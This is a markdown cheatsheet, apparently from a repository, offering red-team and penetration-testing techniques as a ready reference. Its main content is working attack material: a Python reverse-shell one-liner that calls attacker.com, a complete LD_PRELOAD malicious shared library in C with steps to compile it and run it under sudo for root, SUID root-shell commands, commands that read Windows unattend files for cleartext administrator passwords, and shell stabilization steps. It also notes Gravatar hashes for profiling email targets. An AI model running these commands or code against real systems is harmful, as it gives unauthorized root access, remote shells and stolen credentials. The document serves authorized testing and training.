# Red Teaming & Penetration Testing Master Cheatsheet

![Category](https://img.shields.io/badge/Category-Cheatsheets-blue.svg)
![Type](https://img.shields.io/badge/Type-Offensive_Operations-orange.svg)
![OS](https://img.shields.io/badge/OS-Linux_&_Windows-brightgreen.svg)

A centralized operational reference guide compiling high-impact privilege escalation vectors, shell stabilization workflows, container breakouts, and OSINT techniques.

---

## 📋 Table of Contents
1. [Linux Privilege Escalation & SUID](#-linux-privilege-escalation--suid)
2. [Shared Library Hijacking (LD_PRELOAD)](#-shared-library-hijacking-ld_preload)
3. [Windows Privilege Escalation & Unattend Credentials](#-windows-privilege-escalation)
4. [Reverse Shell TTY Spawning & Stabilization](#-reverse-shell-tty-stabilization)
5. [Docker Ephemeral Environments](#-docker-ephemeral-environments)
6. [OSINT Email Hashing (Gravatar)](#-osint-email-hashing-gravatar)

---

## 🐧 Linux Privilege Escalation & SUID

*Source: `linuxPrvCheatSheat.txt`*

### Locating SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Python SUID Reverse Shell / Privilege Escalation
If `/usr/bin/python` or `/usr/bin/python3` has the SUID bit:
```bash
/usr/bin/python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("attacker.com",12345));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```
Or spawning an immediate local root shell:
```bash
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

---

## 💉 Shared Library Hijacking (`LD_PRELOAD`)

*Source: `for_LD_PRELOAD.txt`*

When a user has `sudo` privileges with `env_keep += LD_PRELOAD` configured:
```bash
sudo -l
# Matching Defaults env_keep += LD_PRELOAD
```

### 1. Compile Malicious Shared Object
Create `exploit.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    char *args[] = {"/bin/sh", "-p", NULL};
    execve("/bin/sh", args, NULL);
}
```

### 2. Compile into Shared Library
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/libexploit.so exploit.c
```

### 3. Execute with Sudo
```bash
sudo LD_PRELOAD=/tmp/libexploit.so <ANY_ALLOWED_BINARY>
```
*Instantly drops into a root shell before the target binary executes.*

---

## 🪟 Windows Privilege Escalation

*Source: `forwindows.txt`*

### Unattended Installation Cleartext Credentials
Windows automated setup files frequently retain unencrypted administrator passwords:
```cmd
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\System32\sysprep\unattend.xml
type C:\Windows\System32\sysprep\sysprep.xml
```

### Unquoted Service Paths
Query services with unquoted paths containing spaces:
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

---

## 🐚 Reverse Shell TTY Stabilization

*Source: `reverseToShell.txt`*

Catching a basic netcat connection drops you into a raw "dumb" shell without tab-completion, job control, or arrow keys. Stabilize it using the standard sequence:

```bash
# 1. Inside the reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (Or python -c 'import pty; pty.spawn("/bin/bash")')

# 2. Background the shell:
Ctrl + Z

# 3. In your local attacker terminal:
stty raw -echo; fg

# 4. Press Enter twice, then configure terminal variables:
export TERM=xterm-256color
export SHELL=bash
stty rows 38 columns 136
```

---

## 🐳 Docker Ephemeral Environments

*Source: `runpython2insidedocker.txt`*

Run legacy Python 2 scripts or exploits cleanly in an isolated container mapped to your current workspace:
```bash
docker run --rm -it -v "$(pwd)":/app python:2.7 bash
```

---

## 🕵️ OSINT Email Hashing (Gravatar)

*Source: `tools.txt`*

Gravatar creates globally unique avatar profiles indexed by the **MD5 hash** of a user's lowercase email address:
* URL schema: `https://gravatar.com/avatar/<MD5_EMAIL_HASH>`
* Useful for verifying target email addresses and correlating social media profiles.
